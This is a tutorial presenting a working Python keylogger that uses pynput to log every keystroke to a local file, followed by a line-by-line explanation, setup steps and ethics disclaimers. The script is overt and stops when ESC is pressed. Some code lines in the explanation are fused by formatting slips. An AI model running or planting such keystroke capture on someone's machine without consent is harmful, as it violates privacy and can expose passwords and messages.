A  Simple keylogger involves capturing keystrokes and logging them to a file. Below is an example of such a program written in Python using the pynput library. This program should be used responsibly and only with proper authorization, as creating and deploying keyloggers without permission is unethical and often illegal.

Code Implementation
from pynput import keyboard
def on_press(key):
    """
    Callback function for key press events.
    Logs the pressed key to a file.
    """
    try:
        # Attempt to write the key to the log file
        with open("key_log.txt", "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:  # Printable characters
                log_file.write(key.char)
            elif key == keyboard.Key.space:  # Handle space separately
                log_file.write(" ")
            else:  # Handle special keys
                log_file.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")
def on_release(key):
    """
    Callback function for key release events.
    Exits the listener if the 'ESC' key is pressed.
    """
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False
def main():
    """
    Main function to start the keylogger.
    Listens for keyboard events and handles them with callback functions.
    """
    print("Keylogger is running. Press 'ESC' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
if __name__ == "__main__":
    main()

Explanation
1. Importing the Required Library
from pynput import keyboard
pynput.keyboard: A module for listening to keyboard events. It allows capturing key presses and releases.

2. Callback Function for Key Press Events
def on_press(key):
    """
    Callback function for key press events.
    Logs the pressed key to a file.
    """
This function is triggered whenever a key is pressed. It logs the pressed key into a file named key_log.txt.

Handling Key Types
if hasattr(key, 'char') and key.char is not None:  # Printable characters
    log_file.write(key.char)elif key == keyboard.Key.space:  # Handle space separately
    log_file.write(" ")else:  # Handle special keys
    log_file.write(f" [{key}] ")
Printable Characters: Checks if the key has a char attribute and logs it directly.
Space Key: Writes a space to the log file.
Special Keys: Keys like Shift, Enter, Ctrl, etc., are logged in brackets (e.g., [Shift]).



3. Callback Function for Key Release Events
def on_release(key):
    """
    Callback function for key release events.
    Exits the listener if the 'ESC' key is pressed.
    """
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False
Exit Condition: If the user presses the ESC key, the function returns False, stopping the keylogger.

4. Main Function
def main():
    """
    Main function to start the keylogger.
    Listens for keyboard events and handles them with callback functions.
    """
    print("Keylogger is running. Press 'ESC' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
Keyboard Listener: Listens for key press and release events and calls the respective callback functions (on_press and on_release).
Listener Join: Keeps the program running until the listener is explicitly stopped.

How It Works
1.Run the Script:
oThe program listens for keyboard events as soon as it starts.
2.Log Keys:
oEvery key pressed is recorded in a file (key_log.txt).
oSpecial keys are logged in a readable format (e.g., [Enter], [Tab]).

3.Exit:
oPressing the ESC key stops the keylogger.

Keylog File
The file key_log.txt will look like this after usage:
hello world [Enter] this is a test [Backspace] [Backspace] test

Ethical Considerations
Permission: This script should only be run on devices with explicit consent from the owner.
Legal Compliance: Unauthorized use of keyloggers violates privacy laws and is illegal in most jurisdictions.
Use Cases: Examples of ethical use include:
oMonitoring user input during software testing.
oAcademic research with proper authorization.

Setup Instructions
Setup Instructions
1.Install Dependencies:
pip install pynput
2.Run the Script:
1.Save the code in a .py file (e.g., keylogger.py) and run it using Python.
3.Stop the Script:
1.Press the ESC key to stop the keylogger.


Enhancements
Add encryption to the log file to prevent unauthorized access.
Include timestamp for each key press.
Allow user-defined start and stop keys.
